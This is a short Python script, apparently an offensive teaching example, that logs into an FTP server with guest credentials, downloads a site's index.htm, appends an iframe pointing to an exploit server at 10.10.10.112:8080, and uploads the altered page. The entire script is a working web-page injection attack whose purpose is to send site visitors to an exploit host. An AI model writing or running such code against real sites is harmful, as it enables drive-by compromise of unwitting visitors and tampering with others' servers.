import ftplib
def injectPage(ftp, page, redirect):
	f = open(page + '.tmp', 'w')
	ftp.retrlines('RETR ' + page, f.write)
	print '[+] Downloaded page: ' + page
	f.write(redirect)
	f.close()
	print '[+] Injected malicious iFrame on: ' + page
	ftp.storlines('STOR ' + page, open(page+'.tmp'))
	print '[+] Uploaded injected page: ' + page

host = '127.0.0.1'
userName = 'guest'
passWord = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '<iframe src='+\
	'"http://10.10.10.112:8080/exploit"><\iframe>'
injectPage(ftp, 'index.htm', redirect)
